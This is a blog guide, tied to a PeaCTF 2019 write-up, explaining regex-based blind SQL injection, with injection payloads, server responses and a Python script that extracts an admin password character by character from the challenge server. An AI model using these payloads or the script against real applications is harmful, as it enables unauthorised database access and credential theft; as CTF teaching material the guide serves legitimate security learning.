---
layout: post
title: 	"Regex-based Blind SQL Injection Attacks"
date:	2019-07-28 12:00:00 +0000
categories: guides
---

# Introduction

I recently participated in PeaCTF and came across [a very well made web exploitation challenge](/writeups/peactf/2019/07/28/peactf-all-challenges.html#philips-and-over). It required participants to perform a blind SQL injection attack to retrieve an admin password and successfully login to get the flag. I think writing an actual guide explaining the basic concept behind a regex-based blind SQL injection attack would prove useful to a lot of people since most of the guides I've found don't really explain it in too much depth.

Disclaimer: All the following will follow MySQL syntax. This attack can be adapted to any type of SQL with a little bit of work.

# What is a Blind SQL Injection?

If you've done any introductory CTF web challenges, or any practice challenges on websites like wechall or hackerone, you will have come across SQL injections where a simple `'or 1=1 -- .` dumps information from the DB. This works because the output of the query is actually displayed on the page that you are on. A blind SQL injection is where an SQL injectable parameter/input still exists, however you don't actually get any output from the query itself.

# How does it work?

In cases like this, the only information you ***can*** get is that your query either succeeded (returned TRUE) or failed (returned FALSE). This type of injection is usually found in GET parameters in the url, but can also be found in login forms and in some cases registration forms. You just have to fuzz all possible input fields to find this vulnerability.

I will use my [Philips and Over](/writeups/peactf/2019/07/28/peactf-all-challenges.html#philips-and-over) writeup from the PeaCTF 2019 Qualifiers as a reference. When we change that debug field to 1, supply 'admin' as the username and 'asd' as the answer, we are given the following output from the server.
```
username: admin
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin'

Your answer to the security question is not correct. We have sent admin an email to notify this incident.
```

Looking at this query, we then try to see if an SQL injection actually exists by using `admin'` as the username.
```
Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "'admin''" in /problems/philips-and-over_20_d1b6a0ae1a20d6684ef08d4e630276cc/webroot/result.php on line 65

username: admin'
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin''


Fatal error: Uncaught Error: Call to a member function fetchArray() on boolean in /problems/philips-and-over_20_d1b6a0ae1a20d6684ef08d4e630276cc/webroot/result.php:74 Stack trace: #0 {main} thrown in /problems/philips-and-over_20_d1b6a0ae1a20d6684ef08d4e630276cc/webroot/result.php on line 74
```

Okay so we now know that the username field is indeed SQL injectable. However, we will also notice that a simple `admin' OR 1=1 -- .` won't work.
```
username: admin' OR 1=1 --.
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin' OR 1=1 --.'

Your answer to the security question is not correct. We have sent admin' OR 1=1 --. an email to notify this incident.
```

This happens because the page doesn't actually return the output of the query itself. Rather it will either return TRUE or FALSE depending on the query. This can be verified using a boolean AND injection as follows.
```
# A TRUE query #

username: admin' AND 1=1 --.
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin' AND 1=1 --.'

Your answer to the security question is not correct. We have sent admin' AND 1=1 --. an email to notify this incident.

----------------------------------------------------------------------------------------------------------------------

# A FALSE query

username: admin' AND 1=2 --.
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin' AND 1=2 --.'

User does not exist.
```

As we can see, when we try `admin' AND 1=1 --.`, the query still returns TRUE, since the left side is true (admin is a valid user) and the right side is true (1=1). However, when we try `admin' AND 1=2 --.`, the query returns FALSE because even though admin is still a valid user, 1 != 2 therefore the entire query is false.

The key thing to note here is that the page gives us different results when we have a TRUE query vs when we have a FALSE query. A TRUE query has the text 'Your answer to the security question' in the page, whereas a FALSE query just has 'User does not exist'. This is an important thing to note, and this is exactly what a blind SQL injection utilizes to get information from the database.

In this case, we want the password. We are already given the query, so what we can do is get the password out one character at a time. SQL has what we call 'wildcards', of which there are two main ones that we can utilize. The wildcard '%' means any number of ascii characters, while the wildcard '_' means just one of any ascii character. For example, take the following query that returns TRUE.
```
username: admin' AND 1=(SELECT 1 FROM users WHERE password LIKE '%') --.
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin' AND 1=(SELECT 1 FROM users WHERE password LIKE '%') --.'

Your answer to the security question is not correct. We have sent admin' AND 1=(SELECT 1 FROM users WHERE password LIKE '%') --. an email to notify this incident.
```

We make our query's right hand side a SELECT statement that returns one column from the users table where the password is LIKE '%'. the '%' means 'any number of characters', therefore the SELECT statement does return 1, and our query can then be compacted down to `admin' AND 1=1 --.`, which returns TRUE. This works because the password is a bunch of characters (as passwords usually are).

What we can also do with a wildcard like '%' is test for strings like 'a%', 'b%', 'c%', and etc, to find out what character the password begins with. An example is shown below.
```
username: admin' AND 1=(SELECT 1 FROM users WHERE password LIKE 'a%') --.
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin' AND 1=(SELECT 1 FROM users WHERE password LIKE 'a%') --.'

User does not exist.

username: admin' AND 1=(SELECT 1 FROM users WHERE password LIKE 'b%') --.
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin' AND 1=(SELECT 1 FROM users WHERE password LIKE 'a%') --.'

User does not exist.

......
......

username: admin' AND 1=(SELECT 1 FROM users WHERE password LIKE '7%') --.
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin' AND 1=(SELECT 1 FROM users WHERE password LIKE '7%') --.'

Your answer to the security question is not correct. We have sent admin' AND 1=(SELECT 1 FROM users WHERE password LIKE '7%') --. an email to notify this incident.
```

Once we've tried all characters through a-z, then A-Z, then 0-9, we notice that '7%' returns a TRUE query. This tells us that the password starts with the character '7', and then ends with any number of characters due to the wildcard '%'. The next time we do the query then, we can start again with '7a%', '7b%', etc, to find the second character. Rinse and repeat, and we will end up getting the entire password.

The python script I wrote to demonstrate this is shown below.
```python
#!/usr/bin/env python3

import requests
import sys

# Helper function to easily see the query
def blind(query):
    url = "http://shell1.2019.peactf.com:61940/result.php"
    response = requests.post(url, data={"username":"admin' " +query+ " -- .","answer":"asd","debug":"1"})

    return response

keyspace = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$^&*()-=+'

query_left_side = "AND 1=(SELECT 1 FROM users WHERE password LIKE '"

password = ""

num_of_queries = num_of_true_queries = 0

while True:
	num_of_queries += 1
    for k in keyspace:
    	# query = admin' AND 1=(SELECT 1 FROM users WHERE password LIKE 'k%') -- .
    	# In the above, 'k' is each character that this loop tries
        query = query_left_side + k + "%')" 
        response = blind(query)
        sys.stdout.write('\rPassword: '+password+k)
        if "Your answer to the security" in response.text: # If a TRUE query is returned on character k
            num_of_true_queries += 1
            query_left_side += k # Add the character to the query so we can continue with the next character
            password += k # Add the character to the password string
            break
    if num_of_queries != num_of_true_queries:
        break

print()
print("Password found!: " + password)
```

Note that the script just automates what I explained above. It will start by creating the following query.
```
"admin' AND 1=(SELECT 1 FROM users WHERE password LIKE '" + k + "%') --."
```
Where 'k' is the variable containing each letter we are testing. After each character, it checks to see if a TRUE query is returned by checking whether the text 'Your answer to the security' is in the page. If it is, it will store it in the password variable, as well as add it to the query. Otherwise, it just continues with the next character.

The 'adding it to the query' bit is the most important here, as that is what will make the query start at the next character. Running the script will give is the following output.
```
» ./sqli.py
Password: 70725064+
Password found!: 70725064
```

Once we use the password to login to the website as the 'admin' user, we get the flag.

# Recap

That was a demonstration of what a regex-based blind SQL injection attack looks like. We simply used the fact that the page gives us different results depending on whether the query it performs returns TRUE or FALSE. We leveraged that to get the password one character at a time. Do take a look at my writeup of [Philips and Over](/writeups/peactf/2019/07/28/peactf-all-challenges.html#philips-and-over) from the PeaCTF 2019 Qualifiers, as well as any other writeups that you may want to check out.

Hope this guide helps someone out!